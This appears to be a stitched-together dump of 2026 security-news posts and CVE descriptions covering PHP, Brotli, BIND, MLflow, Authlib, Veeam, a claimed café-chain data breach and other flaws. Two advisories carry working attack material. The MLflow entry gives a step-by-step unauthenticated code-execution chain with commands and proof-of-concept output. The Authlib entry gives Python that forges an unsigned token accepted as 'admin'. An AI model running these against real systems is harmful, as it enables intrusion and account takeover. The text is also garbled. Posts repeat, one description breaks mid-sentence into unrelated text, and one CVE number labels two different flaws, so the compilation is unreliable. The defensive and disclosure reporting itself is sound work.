posts.content:
🏆 New Achievement! Boot Sequence Interrupted — WIPE INCOMING!

PHASE ONE MECHANICS ACTIVE. CVE-2026-97631 has spawned in TianoCore EDK II, the open-source UEFI codebase baked into firmware by most of the world's server vendors and cloud providers. Severity: 9.5 out of 10. The exploit hits an ICMP component — a memory-corruption flaw that lets attackers execute malicious code BEFORE the operating system loads. Before Secure Boot. Before TPM. (1/3)

Code-execution flaw in UEFI firmware threatens most servers on planet Earth

서버 UEFI 펌웨어에 널리 사용되는 TianoCore EDK II에서 심각도 9.5점의 코드 실행 취약점 CVE-2026-97631이 공개됐다. PXE 네트워크 부팅 중 ICMP 오류 메시지를 처리할 때 발생하는 버퍼 오버플로로, 공격자는 조건이 맞으면 운영체제 로딩 전에 악성 코드를 실행할 수 있다. 공격에는 PXE 부팅 시점의 네트워크 접근이 필요하며, 코드 실행을 위해서는 대상 펌웨어 빌드 정보도 필요하다. 수정 코드가 이미 공개...

Barista, one of Sri Lanka's largest café chains with more than 100 outlets, has been targeted by an actor using the handle "secret_solder".

The actor claims to have gained unauthorized server access by exploiting PHP vulnerabilities CVE-2026-109618 and CVE-2026-109619, allegedly achieving remote code execution without authentication.

According to the post, the server was running an outdated PHP 8.1.34 installation with exposed configuration details.

The actor also claims to have extracted customer names, email addresses, phone numbers, and delivery addresses from server memory.

A sample containing customer names and phone numbers was published. The intrusion and vulnerability claims remain independently unverified.

posts.content:
🚨🇺🇸 CISA confirms critical PHP2Shell flaws are now being exploited in attacks

CISA has added CVE-2026-109618 and CVE-2026-109619 to its Known Exploited Vulnerabilities catalog after confirming active exploitation.
⠀
Known collectively as PHP2Shell, the two memory corruption flaws can allow an unauthenticated attacker to remotely execute code on PHP systems serving web requests.

Affected configurations include PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP and LiteSpeed. The PHP team considers mod_php installations at the highest risk.
⠀
Both vulnerabilities have a CVSS 4.0 score of 9.2.

Fixed versions:

• PHP 8.5.12
• PHP 8.4.27
• PHP 8.3.36
• PHP 8.2.35
⠀
CISA has ordered U.S. federal agencies to remediate the vulnerabilities by October 29.

The PHP team says there are no complete mitigations and that updating is the only safe solution.

Source: https://www.cisa.gov/news-events/alerts/2026/10/26/cisa-adds-two-known-exploited-vulnerabilities-catalog

posts.content:
This week has been extremely busy. I have seen 4x RCE vulnerabilities, compromised eMudhra CA certificates that spill into their own CVE for Java with a CVSS of 9.1, and 3x DoS type of vulnerabilities, all in very popular and widely used software that can either crash under specific conditions or give remote code execution capabilities to threat actors. The mentioned vulnerabilities are:

PHP RCE: CVE-2026-109618/109619/115560
Gitlab RCE: CVE-2026-110264
Node2Shell \ HTTP2Shell RCE: CVE-2026-111497
ISC Bind 9 RCE: CVE-2026-94300

ISC Bind 9 DoS: CVE-2026-19630/96888/97313
Windows SMB Server DoS: CVE-2026-91403
Unbound DNS-over-QUIC Bug: CVE-2026-97206
Oracle Java (JSSE) containing compromised eMudhra certificates: CVE-2026-91403

Patching all these vulnerabilities on endpoints and servers will take a humungous amount of time and effort, as it can't be done overnight and is heavily dependent on the size of your environment. It's good that we are getting security patches for software that had critical vulnerabilities present for years without anyone discovering them, like in the Gitlab case where the RCE vulnerability went undiscovered for 12 years across all their releases.

What will happen over the coming years is that we will get a massive influx of vulnerabilities just like the one seen this week, but over time it will stabilise more as software becomes more secure, and we will start seeing fewer vulnerabilities overall.

#Gitlab #eMudhra #Node2Shell #CyberSecurity #Vulnerabilities

CVE-2026-109618.description: PHP uses longjmp() for out-of-memory (OOM) errors to exit the current context and abort handling of the request. Some contexts may not properly account for this scenario and leave request memory in an uninitialized state before performing an allocation. The subsequent request cleanup procedure may read or branch on this memory. Multiple OOM strategies can consistently trigger this condition and lead to remote code execution (RCE).

posts.content:
🚨🇺🇸 CISA confirms critical PHP2Shell flaws are now being exploited in attacks

CISA has added CVE-2026-109618 and CVE-2026-109619 to its Known Exploited Vulnerabilities catalog after confirming active exploitation.
⠀
Known collectively as PHP2Shell, the two memory corruption flaws can allow an unauthenticated attacker to remotely execute code on PHP systems serving web requests.

Affected configurations include PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP and LiteSpeed. The PHP team considers mod_php installations at the highest risk.
⠀
Both vulnerabilities have a CVSS 4.0 score of 9.2.

Fixed versions:

• PHP 8.5.12
• PHP 8.4.27
• PHP 8.3.36
• PHP 8.2.35
⠀
CISA has ordered U.S. federal agencies to remediate the vulnerabilities by October 29.

The PHP team says there are no complete mitigations and that updating is the only safe solution.

Source: https://www.cisa.gov/news-events/alerts/2026/10/26/cisa-adds-two-known-exploited-vulnerabilities-catalog

posts.content:
Palo finally published an advisory outlining impact from CVE-2026-111497 in brotli.

https://security.paloaltonetworks.com/CVE-2026-111497

A buffer overflow vulnerability in the Brotli decoder (c/dec/decode.c) in Google Brotli versions 1.0.3 through 1.2.0 on all platforms allows a remote unauthenticated attacker to corrupt adjacent decoder state memory, disclose sensitive memory contents, cause a denial of service, or potentially execute arbitrary code using a crafted Brotli-compressed stream. Users need to update any Brotli libraries or binaries between 1.0.3 through 1.2.0 to the latest available version: 1.0.10 or 1.1.1 or 1.2.1. Brotli is commonly used by many HTTP-based applications including Node.js.

Most importantly:

This issue is applicable to PAN-OS software on PA-Series and VM-Series firewalls that have inspection of Brotli compressed traffic and TLS/SSL decryption enabled on the dataplane. There is no impact on the Management interface (web or API) of the PAN-OS devices.

🚨 Crimeflare releases emergency WAF rules for critical Brotli vulnerability

Crimeflare has added two detection rules for CVE-2026-111497 to its Managed Ruleset, targeting Brotli-encoded request bodies and the Next.js image optimization endpoint.
⠀
The vulnerability is an out-of-bounds write in the Brotli decoder. Malformed compressed input can corrupt process memory, potentially causing crashes, memory disclosure or remote code execution.

It affects software that uses vulnerable Brotli versions, including supported Node.js 22.x, 24.x and 26.x releases.
⠀
Crimeflare’s new rules are enabled by default in Log mode. They provide visibility into matching requests but do not block them unless customers change the action.

Crimeflare warns that blocking the Next.js rule may disrupt image delivery and recommends reviewing matches before enabling enforcement.
⠀
Node.js users should update to:

• 22.23.4
• 24.22.1
• 26.12.1

The WAF rules are an additional mitigation, not a replacement for patching.

Source: https://developers.cloudflare.com/changelog/post/2026-10-25-emergency-waf-release

posts.content:
🚨 Microsoft issues emergency .NET updates after earlier patches failed to fully fix two vulnerabilities

Microsoft says its October 13 updates did not completely address CVE-2026-102870 and CVE-2026-70197, prompting new out-of-band security releases for .NET 8, 9, 10 and 11.
⠀
CVE-2026-102870 is a high-severity remote code execution flaw in the Blazor WebAssembly debugger.

Attacker-controlled data from a debugged application could escape a generated C# string and execute code on a developer’s computer when they evaluate an expression. The vulnerability has a CVSS score of 8.8 and requires user interaction.
⠀
The emergency updates also address:

• CVE-2026-70197, a SocketAsyncEventArgs memory corruption flaw
• CVE-2026-111497, a Brotli decoder out-of-bounds write
• CVE-2026-114148, a Linux source-build tarball ownership issue
⠀
Microsoft warns that updating the shared .NET runtime alone is not enough to fix the Blazor vulnerability when affected NuGet packages are referenced directly.

Developers should update Microsoft.AspNetCore.Components.WebAssembly.Server and DevServer to patched releases, including version 10.0.14 for .NET 10 projects.

Source: https://devblogs.microsoft.com/dotnet/dotnet-october-2026-oob-security-updates

Gitlab RCE: CVE-2026-110264

Patching all these vulnerabilities on endpoints and servers will take a humungous amount of time and effort, as it can't be done overnight and is heavily dependent on the size of your environment. It's good that we are getting security patches for software that had critical vulnerabilities present for years without anyone discovering them, like in the Gitlab case where the RCE vulnerability went undiscovered for 12 years across all their releases.

What will happen over the coming years is that we will get a massive influx of vulnerabilities just like the one seen this week, but over time it will stabilise more as software becomes more secure, and we will start seeing fewer vulnerabilities overall.

CVE-2026-111497.description:
A buffer overflow vulnerability in the Brotli decoder (c/dec/decode.c) in Google Brotli versions 1.0.3 through 1.2.0 on all platforms allows a remote unauthenticated attacker to corrupt adjacent decoder state memory, disclose sensitive memory contents, cause a denial of service, or potentially execute arbitrary code using a crafted Brotli-compressed stream.





Users need to update any Brotli libraries or binaries between 1.0.3 through 1.2.0 to the latest available version: 1.0.10 or 1.1.1 or 1.2.1.

CVE-2026-109218.description: The Contact Manager plugin for WordPress is vulnerable to Arbitrary File Upload in all versions up to, and including, 9.1.2 via the add_message function. This is due to an incomplete extension blacklist that fails to detect dangerous extensions when a trailing dot causes the extension-derivation routine to return an empty string, which sanitize_file_name() then silently removes before the file is written to disk. This makes it possible for unauthenticated attackers to upload files that may be executable, which makes remote code execution possible. Successful code execution additionally requires the server to use Apache with libapache2-mod-php (which maps .phar to PHP by default) and the attacker to retrieve the uploaded file within the brief window before it is removed by unlink() at end of request.

posts.content:
This week has been extremely busy. I have seen 4x RCE vulnerabilities, compromised eMudhra CA certificates that spill into their own CVE for Java with a CVSS of 9.1, and 3x DoS type of vulnerabilities, all in very popular and widely used software that can either crash under specific conditions or give remote code execution capabilities to threat actors. The mentioned vulnerabilities are:

PHP RCE: CVE-2026-109618/109619/115560
Gitlab RCE: CVE-2026-110264
Node2Shell \ HTTP2Shell RCE: CVE-2026-111497
ISC Bind 9 RCE: CVE-2026-94300

ISC Bind 9 DoS: CVE-2026-19630/96888/97313
Windows SMB Server DoS: CVE-2026-91403
Unbound DNS-over-QUIC Bug: CVE-2026-97206
Oracle Java (JSSE) containing compromised eMudhra certificates: CVE-2026-91403

Patching all these vulnerabilities on endpoints and servers will take a humungous amount of time and effort, as it can't be done overnight and is heavily dependent on the size of your environment. It's good that we are getting security patches for software that had critical vulnerabilities present for years without anyone discovering them, like in the Gitlab case where the RCE vulnerability went undiscovered for 12 years across all their releases.

What will happen over the coming years is that we will get a massive influx of vulnerabilities just like the one seen this week, but over time it will stabilise more as software becomes more secure, and we will start seeing fewer vulnerabilities overall.

#Gitlab #eMudhra #Node2Shell #CyberSecurity #Vulnerabilities

CVE-2026-94300.description:
Replaying GSS-TSIG signed UDP messages can result in memory corruption in "`named`".  An attacker who can capture a previously signed UDP message can replay it while the negotiated TSIG key is still valid. By also sending crafted queries to a zone the attacker controls, the attacker may potentially achieve remote code execution.
This issue affects BIND 9 versions 9.11.0 through 9.18.50, 9.20.0 through 9.20.29, 9.21.0 through 9.21.26, 9.11.3-S1 through 9.18.50-S1, and 9.20.9-S1 through 9.20.29-S1.

posts.content:
🚨🇺🇸 Microsoft Authenticator flaw allowed malicious Android apps to steal work account tokens

Tracked as CVE-2026-80097, the high-severity vulnerability allowed an Android app with no permissions to impersonate trusted Microsoft apps such as Teams and request tokens for a work account signed into Authenticator.
⠀
Researchers demonstrated that the stolen tokens could provide access to:

• Email and the ability to send messages
• Files stored in Microsoft services
• Calendars and Teams chats
• Authentication methods and passkey management
⠀
The flaw existed because Authenticator trusted identity information supplied by the requesting app instead of confirming which app actually made the request.
⠀
Microsoft rates the vulnerability 8.6 and says exploitation requires a malicious app on the device and user interaction during authentication. However, researchers reported obtaining tokens without further interaction when a work account was already signed in.
⠀
Microsoft says it has found no evidence of exploitation. The issue affects Authenticator for Android versions before 6.2606.4246.

Users should update to version 6.2606.4246 or later.

Source: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-80097

CVE-2026-92372.description:
An out-of-bounds write vulnerability in the
screen-image decoder of TeamViewer Full Client for Linux and macOS prior to
version 15.83 allows a remote attacker to execute arbitrary code by supplying

This is due to the plugin performing file type validation via wp_check_filetype and wp_check_filetype_and_ext but never checking whether those validation calls produced errors before move_uploaded_file() is called, combined with no nonce or capability check on the AJAX handler. ProtobufParser._readStringKey() reads the length prefix of a protobuf map entry's string key into an attacker-controlled int and then checks (_inputPtr + len) <= _inputEnd using signed arithmetic. For values near Integer.MAX_VALUE the addition ...

CVE-2026-110747.description:
ProtobufParser._readStringKey() reads the length prefix of a protobuf map entry's string key into an attacker-controlled int and then checks (_inputPtr + len) <= _inputEnd using signed arithmetic. For values near Integer.MAX_VALUE the addition overflows to a negative value and the check passes even when the input contains no key data. The parser then calls _finishShortText(len), which expands the text buffer to the declared length via TextBuffer.expandCurrentSegment and Arrays.copyOf, throwing OutOfMemoryError: Requested array size exceeds VM limit.



An 8-byte malformed message containing a map entry with a declared key length of 0x7FFFFFFF is sufficient. Configured StreamReadConstraints, including maxStringLength, maxNameLength, maxDocumentLength and maxNestingDepth, do not prevent the failure. Applications running with -XX:+ExitOnOutOfMemoryError terminate the JVM.



This is the same integer-overflow pattern addressed for other call sites in the remediation associated with CVE-2026-104016 and CVE-2026-104017; the map-key call site was corrected on the 3.x branches only, leaving the corresponding 2.x branches unguarded. Release lines 2.18, 2.19 and 2.20 do not contain _readStringKey() and are not affected by this vector. No privileges or user interaction beyond the ability to submit data for parsing are required. The 3.0 release line and 3.1.0-3.1.5 / 3.2.0-3.2.1 do not contain _readStringKey() and are therefore not affected; the method first appears in 3.1.6 and 3.2.2, mirroring its introduction at 2.21.6 on the 2.x side.

posts.content: CVE-2026-106013 (CRITICAL): Jupiter X Core ≤4.61.0 allows authentication bypass via Twitter/X login handler — attackers can access WP admin as app owner. Disable Twitter/X login or the plugin until fixed. https://radar.offseq.com/threat/cve-2026-106013-cwe-287-improper-authentication-in-artbees-jupiter-x-core-324b257972296553 #OffSeq #WordPress #CVE2026_106013 #Infosec

CVE-2026-106013.description: The Jupiter X Core plugin for WordPress is vulnerable to Authentication Bypass via the Twitter/X Social Login handler in all versions up to and including 4.61.0. The vulnerability exists within the verify_twitter_callback function because after exchanging the visitor's oauth_verifier for their access token, the handler never calls setOauthToken() to reassign the returned credentials to the TwitterOAuth client, causing the subsequent account/verify_credentials API call to remain signed with the site operator's stored Access Token and Access Token Secret rather than the authenticating visitor's token. This causes the X API to return the profile of the X application owner instead of the signing-in visitor, and the plugin then resolves and authenticates a WordPress account solely by matching that owner's email address via wp_set_auth_cookie(), allowing unauthenticated attackers to gain authenticated access as the WordPress user whose email corresponds to the X app owner, who is typically the site administrator.

CVE-2026-23111.description:
In the Linux kernel, the following vulnerability has been resolved:

netfilter: nf_tables: fix inverted genmask check in nft_map_catchall_activate()

nft_map_catchall_activate() has an inverted element activity check
compared to its non-catchall counterpart nft_mapelem_activate() and
compared to what is logically required.

nft_map_catchall_activate() is called from the abort path to re-activate
catchall map elements that were deactivated during a failed transaction.
It should skip elements that are already active (they don't need
re-activation) and process elements that are inactive (they need to be
restored). Instead, the current code does the opposite: it skips inactive
elements and processes active ones.

Compare the non-catchall activate callback, which is correct:

  nft_mapelem_activate():
    if (nft_set_elem_active(ext, iter->genmask))
        return 0;   /* skip active, process inactive */

With the buggy catchall version:

  nft_map_catchall_activate():
    if (!nft_set_elem_active(ext, genmask))
        continue;   /* skip inactive, process active */

The consequence is that when a DELSET operation is aborted,
nft_setelem_data_activate() is never called for the catchall element.
For NFT_GOTO verdict elements, this means nft_data_hold() is never
called to restore the chain->use reference count. Each abort cycle
permanently decrements chain->use. Once chain->use reaches zero,
DELCHAIN succeeds and frees the chain while catchall verdict elements
still reference it, resulting in a use-after-free.

This is exploitable for local privilege escalation from an unprivileged
user via user namespaces + nftables on distributions that enable
CONFIG_USER_NS and CONFIG_NF_TABLES.

Fix by removing the negation so the check matches nft_mapelem_activate():
skip active elements, process inactive ones.

CVE-2026-98432.description:
In the Linux kernel, the following vulnerability has been resolved:

ipv4: free inet_opt and ireq_opt after an RCU grace period

tcp_v4_syn_recv_sock() transfers ownership of ireq->ireq_opt to the
child socket (newinet->inet_opt) without copying it.

Another cpu can concurrently process a retransmitted SYN for the same
request socket, and send a SYNACK from tcp_check_req().
tcp_v4_send_synack() and inet_csk_route_req() read ireq->ireq_opt
under rcu_read_lock() only, and ip_build_and_send_pkt() and
ip_options_build() then read opt->optlen twice.

Note that the SYNACK timer itself is not an issue: it holds a
reference on its request socket, and inet_csk_reqsk_queue_drop()
calls timer_delete_sync() before the child can be freed.

Since commit 079096f103fa ("tcp/dccp: install syn_recv requests
into ehash table"), request sockets are processed without holding
the listener lock, so nothing prevents the child socket from being
freed while the SYNACK is still being built. TCP child sockets do
not have SOCK_RCU_FREE, and inet_sock_destruct() frees inet_opt
with a plain kfree(), leading to a use-after-free in
ip_options_build().

A similar issue exists with request socket migration
(net.ipv4.tcp_migrate_req=1, or a BPF_SK_REUSEPORT_SELECT_OR_MIGRATE
program). reqsk_timer_handler() clones the request socket with
inet_reqsk_clone(), so that the old request socket and its clone
share the same ireq_opt, then reqsk_migrate_reset() clears the
pointer in the old one. Another cpu holding a reference on the old
request socket can still be using these options (sending a SYNACK,
or creating a child in tcp_v4_syn_recv_sock()) when the clone is
freed, and tcp_v4_reqsk_destructor() also uses a plain kfree().

Readers already use RCU, and other paths replacing inet_opt
(do_ip_setsockopt(), cipso_v4_sock_setattr()...) already use
kfree_rcu(). Use kfree_rcu() in inet_sock_destruct() and
tcp_v4_reqsk_destructor() as well.

IPv6 is not affected by the first issue, because tcp_v6_syn_recv_sock()
duplicates the options. tcp_v6_reqsk_destructor() has the same
migration issue with ipv6_opt, which is only set by CALIPSO. This
will be addressed in a separate patch.

🚨🇺🇸 Veeam patches critical Backup & Replication authorization bypass

Veeam has released security updates addressing five vulnerabilities across Backup & Replication, Veeam Agent for Linux and Veeam ONE.
⠀
The most serious, CVE-2026-108142, carries a CVSS score of 9.1 and allows an unauthenticated attacker to bypass authorization on the CDP Coordinator Service.
⠀
Other patched vulnerabilities include:

• CVE-2026-105477: Local privilege escalation in managed Veeam Agent for Linux installations, CVSS 7.3
• CVE-2026-108140: Arbitrary file writes through path traversal, CVSS 5.9
• CVE-2026-108141: Arbitrary file writes through path traversal, CVSS 5.9
• CVE-2026-107671: Veeam ONE administrator can bypass MFA by disabling it before completing verification, CVSS 8.5
⠀
Backup & Replication versions 13.0 and 13.1 are affected by the authorization and path-traversal flaws.

Older 12.x releases are not affected by those specific issues.
⠀
Administrators should update to:

• Backup & Replication 13.1.2 build 13.1.2.57
• Backup & Replication 13.0.3 build 13.0.3.63
• Veeam Agent for Linux 13.1.2 build 13.1.2.11
• Veeam ONE 13.1 P1 build 13.1.0.7940

Sources: https://www.veeam.com/kb4948, https://www.veeam.com/kb4951

🔴 CVE-2026-116692 - Critical (9.8)

MLflow is an open source AI engineering platform for agents, large language models, and machine learning models. From 3.12.0rc0 until 3.17.0, third-party scorer deserialization in mlflow/genai/scorers/base.py accepts request-selected descendants o...

🔗 https://www.thehackerwire.com/vulnerability/CVE-2026-116692/

#CVE #vulnerability #infosec #cybersecurity #security #Tenda #patchstack

CVE-2026-116692.description:
## Summary MLflow 3.12.0 introduced registration and deserialization support for third-party scorers in OSS MLflow. During scorer deserialization, the server accepts a request-controlled Python module path beneath one of four allowed package prefixes, imports that module, obtains a request-controlled class, and instantiates it synchronously. An HTTP caller can combine this behavior with MLflow's built-in experiment, run, and artifact-upload endpoints: 1. Create an experiment whose local artifact location points to a writable allowed scorer package. 2. Create a run, causing MLflow to allocate `//artifacts/`. 3. Upload a Python module into that run artifact directory. 4. Submit a serialized third-party scorer whose module path resolves to the uploaded file. 5. Trigger server-side import and class construction through `/ajax-api/3.0/mlflow/scorer/invoke`. On the default no-auth server using the official MLflow v3.14.0 image, this produces unauthenticated arbitrary Python code execution with the privileges of the MLflow server process. The reproduced image runs the process as uid 0 and permits writes to its installed Python package tree. The attached proof of concept is intentionally harmless. The uploaded constructor performs one action only: it writes a random marker beside its own uploaded run artifact. The marker is then downloaded through MLflow's run-artifact endpoint and checked for an exact match. ## Technical details ### 1. The allow-list accepts attacker-created descendants At release commit `86cd7f5a1dc25a1387ad07c87811bbc30f62951c`, `mlflow/genai/scorers/scorer_utils.py` defines these allowed roots: ```python THIRD_PARTY_SCORER_ALLOWED_MODULES = frozenset({ "mlflow.genai.scorers.ragas", "mlflow.genai.scorers.deepeval", "mlflow.genai.scorers.trulens", "mlflow.genai.scorers.phoenix", }) ``` In `mlflow/genai/scorers/base.py`, the deserializer accepts either an exact root or any descendant: ```python module_path == m or module_path.startswith(m + ".") ``` It then performs the following operations using request-controlled values: ```python module = importlib.import_module(module_path) scorer_class = getattr(module, class_name, None) scorer_instance = scorer_class(**init_kwargs) ``` A package-name prefix is not a provenance boundary. If the server process can write below an allowed package, an attacker-created descendant can satisfy the string-prefix check and become importable Python code. Relevant source locations at the v3.14.0 release commit: * `mlflow/genai/scorers/scorer_utils.py`, allowed third-party scorer modules * `mlflow/genai/scorers/base.py`, third-party scorer deserialization and construction ### 2. Deserialization occurs before trace processing In `mlflow/server/handlers.py`, `_invoke_scorer_handler()` parses the supplied serialized scorer and calls: ```python scorer = Scorer.model_validate_json(serialized_scorer) ``` Only after deserialization and construction does the handler call: ```python batches = get_trace_batches_for_scorer(trace_ids, scorer, tracking_store) ``` The attacker-controlled constructor therefore runs before the server validates or resolves the supplied trace IDs. The minimal proof class is deliberately not a complete MLflow scorer. After its constructor writes the marker, later trace-batching logic accesses scorer attributes that the proof class does not implement. The resulting HTTP 500 occurs after code execution and does not invalidate the proof. No background job execution or special job-execution server option is required to reach the constructor. ### 3. MLflow's artifact layout places the module under the trusted prefix The experiment creation endpoint accepts an `artifact_location`. For file-backed experiments, MLflow derives each run artifact directory as: ```text //artifacts/ ``` The proof of concept selects this package directory in the official v3.14.0 image: ```text file:///usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens ``` After creating a run and uploading `audit_.py`, the resulting filesystem location is: ```text /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens//artifacts/audit_.py ``` The corresponding import path is: ```text mlflow.genai.scorers.trulens..artifacts.audit_ ``` The attack does not overwrite an existing package module. It creates a new run-scoped module in the normal file-backed artifact layout. The run ID is returned to the caller. ### 4. Authentication and authorization behavior With authentication disabled, as in the default reproduced server configuration, no credentials are required. When MLflow basic authentication is enabled, authentication still applies. However, the scorer-invocation AJAX endpoint is assigned to `validate_gateway_proxy`, which returns `True` without performing an experiment- or scorer-level resource permission check. Practical exploitation in an authenticated deployment still requires the caller to create an experiment and run and upload artifacts to them. The key authorization issue is that scorer deserialization itself is not gated by a resource-specific permission check for the supplied experiment before the import occurs. ## Proof of concept The attached reproduction is intentionally isolated: * exact official MLflow v3.14.0 image pinned by manifest digest; * Docker network disabled; * MLflow bound to container loopback; * no shell command or external callback; * no external request; * no host filesystem write; * marker created beside the uploaded run artifact; * marker retrieved through the run-artifact download endpoint; and * disposable container removed after completion. Run: ```bash ./run-official-image.sh ``` Expected output: ```text MLFLOW_VERSION=3.14.0 PACKAGE_DIR=/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens CREATE_EXPERIMENT_STATUS=200 CREATE_RUN_STATUS=200 UPLOAD_STATUS=200 INVOKE_STATUS=500 PROOF_DOWNLOAD_STATUS=200 PROOF_MATCH=1 RESULT=AFFECTED ``` The security-relevant result is: ```text PROOF_MATCH=1 RESULT=AFFECTED ``` This proves that the attacker-controlled constructor executed in the MLflow server process before the later scorer-processing failure. ## Reproduction environment * **Release:** MLflow v3.14.0 * **Release commit:** `86cd7f5a1dc25a1387ad07c87811bbc30f62951c` * **Official image:** `ghcr.io/mlflow/mlflow:v3.14.0` * **Manifest digest:** `sha256:967de3ca34b6a5751718e380a0a383eb0ce1a6f5b484f363bd0da7559117a5f8` * **Python version:** 3.10.18 * **Image-configured user:** empty * **Observed runtime user:** uid 0 * **Server bind:** `127.0.0.1:5000` * **Container network:** disabled * **Backend store:** `sqlite:////work/mlflow.db` * **Default artifact root:** `/work/artifacts` * **Authentication:** disabled * **Special job-execution option:** none Server command inside the disposable container: ```bash mlflow server \ --host 127.0.0.1 \ --port 5000 \ --backend-store-uri sqlite:////work/mlflow.db \ --default-artifact-root /work/artifacts ``` ## Affected range and source lineage The vulnerable third-party scorer deserialization behavior was introduced by commit: ```text 02eea26035b9d8e65af31e6e8f058ca195f62cdd Enable third-party scorer registration in OSS MLflow (#22634) ``` The feature is absent from v3.11.1 and first appears in v3.12.0. Runtime reproduction succeeds on v3.14.0. The relevant `mlflow/genai/scorers/base.py` content is unchanged at master commit: ```text 20858c9426a9644dfcf9545a92cbb534376779eb ``` No fixed release was identified as of 2026-07-12. ## Impact On the reproduced stock no-auth image, any network caller who can reach the tracking server can execute Python code as the MLflow process without credentials or user interaction. Successful exploitation provides confidentiality, integrity, and availability impact over all data, credentials, network access, and filesystem locations available to the MLflow server process. The stock image's runtime uid 0 increases container-level impact. Host impact still depends on the container runtime configuration, mounted paths, granted capabilities, socket exposure, and other isolation controls. In authentication-enabled deployments, exploitation requires an authenticated principal capable of creating an experiment and run and uploading artifacts. The exact chain also requires the server process to be able to write beneath one of the allowed scorer packages. This condition holds in the reproduced official image and may hold in virtual environments installed and run by the same operating-system user. A read-only container filesystem or a scorer package directory owned by a different, non-writable user blocks this exact placement chain. ## Artifacts and attachments ### Remote proof-of-concept script POC Script: [new_remote_poc.py](https://github.com/user-attachments/files/29936616/new_remote_poc.py) The remote proof of concept was then executed as follows. The disposable machine’s public IP has been redacted: ```bash python3 new_remote_poc.py \ --target http:// \ --package-dir /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens \ --acknowledge-owned-target I_OWN_THIS_TARGET ``` The complete sanitized output was: ```text TARGET=http:// VERSION_STATUS=200 MLFLOW_VERSION=3.14.0 CREATE_EXPERIMENT_STATUS=200 EXPERIMENT_ID=2 CREATE_RUN_STATUS=200 RUN_ID=9a2d665eb38940b68983f0586f623115 UPLOAD_STATUS=200 IMPORT_PATH=mlflow.genai.scorers.trulens.9a2d665eb38940b68983f0586f623115.artifacts.audit_1783843760683972103 INVOKE_STATUS=500 INVOKE_RESPONSE_PREVIEW='\n\n500 Internal Server Error\n

Internal Server Error

\n

The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.

\n' PROOF_DOWNLOAD_STATUS=200 EXPECTED_MARKER_SHA256=7a423b479df3524567fdf8cc3e7f6c4bfccc577fbcc4bac9519db8bd1cc61ed5 PROOF_MATCH=1 SERVER_CLEANUP_PATH=/usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens/9a2d665eb38940b68983f0586f623115 PROOF_OUTPUT_BEGIN { "cwd": "/", "machine": "x86_64", "marker": "MLFLOW_REMOTE_SAFE_MARKER_1783843760683972103", "os_release": "PRETTY_NAME=\"Debian GNU/Linux 11 (bullseye)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"11\"\nVERSION=\"11 (bullseye)\"\nVERSION_CODENAME=bullseye\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n", "platform": "whoami_returncode": 0, "whoami_stderr": "" } PROOF_OUTPUT_END RESULT=AFFECTED EXPERIMENT_METADATA_CLEANUP_STATUS=200 CLEANUP_NOTE=discard the temporary test instance or remove SERVER_CLEANUP_PATH on the owned host ``` The proof file was also verified directly inside the disposable container: ```bash cat /usr/local/lib/python3.10/site-packages/mlflow/genai/scorers/trulens/9a2d665eb38940b68983f0586f623115/artifacts/execution-proof-1783843760683972103.json ``` The file contained: ```json { "cwd": "/", "machine": "x86_64", "marker": "MLFLOW_REMOTE_SAFE_MARKER_1783843760683972103", "os_release": "PRETTY_NAME=\"Debian GNU/Linux 11 (bullseye)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"11\"\nVERSION=\"11 (bullseye)\"\nVERSION_CODENAME=bullseye\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n", "platform": CVE-2026-115189.description: A server-side template injection vulnerability exists in the Twig theme rendering sandbox of Mautic. The sandbox introduced to restrict user-uploaded theme templates (the fix for GHSA-9fx4-7cmj-47vg) does not fully enforce its restrictions, allowing a crafted theme template to escape the sandbox. An authenticated user with the core:themes:create permission can upload a malicious theme whose template is later rendered, resulting in execution of arbitrary code on the server with the privileges of the web server process. This allows the attacker to execute operating system commands, read server-side files including configuration files and database credentials, write files, and reach internal services. In default installations the core:themes:create permission is granted to the Administrator role, and in multi-operator setups it may be delegated to other roles. This is an incomplete fix for GHSA-9fx4-7cmj-47vg.

You. Had. One. Job.

https://nvd.nist.gov/vuln/detail/cve-2026-96760

Authlib (v1.7.2 and below) contains a signature verification bypass vulnerability. The JsonWebSignature.deserialize_json() method accepts a JSON Serialization JWS object and returns the payload as successfully verified without checking for a signature and without requiring a cryptographic key.

CVE-2026-96760.description:
Authlib (prior to 1.9.0) contains a signature verification bypass vulnerability. The JsonWebSignature.deserialize_json() method accepts a JSON Serialization JWS object and returns the payload as successfully verified without checking for a signature and without requiring a cryptographic key.

## Root cause

`authlib/jose/rfc7515/jws.py`, read on the installed 1.8.0 artifact:

```python
is_valid = True                        # set before anything is checked
for header_obj in obj["signatures"]:   # empty array means the body never runs
    jws_header, valid = self._validate_json_jws(...)
    if not valid:
        is_valid = False
...
if is_valid:
    return rv                          # returns the payload as verified
```

`is_valid` is initialised to `True` and only ever set to `False` from inside the loop. A JWS JSON
Serialization object whose `signatures` array is empty iterates zero times, so the flag survives and
the payload is returned as successfully verified. No key is consulted, because no signature is
examined.

## Reproduction

```python
import base64
from authlib.jose import JsonWebSignature

def b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

jws = JsonWebSignature()
payload = b'{"sub":"attacker","role":"admin"}'
forged = {"payload": b64(payload), "signatures": []}

print(jws.deserialize_json(forged, key=None))
```

Observed on authlib 1.8.0, Python 3.14, clean virtualenv:

```
[A] ATTACK   general JSON, signatures:[] , key=None
    ACCEPTED  -> {'header': [], 'payload': b'{"sub":"attacker","role":"admin"}'}
[B] ATTACK   general JSON, signatures:[] , key=<real key>
    ACCEPTED  -> {'header': [], 'payload': b'{"sub":"attacker","role":"admin"}'}
[C] CONTROL+ genuine general JSON with 2 signatures, right key
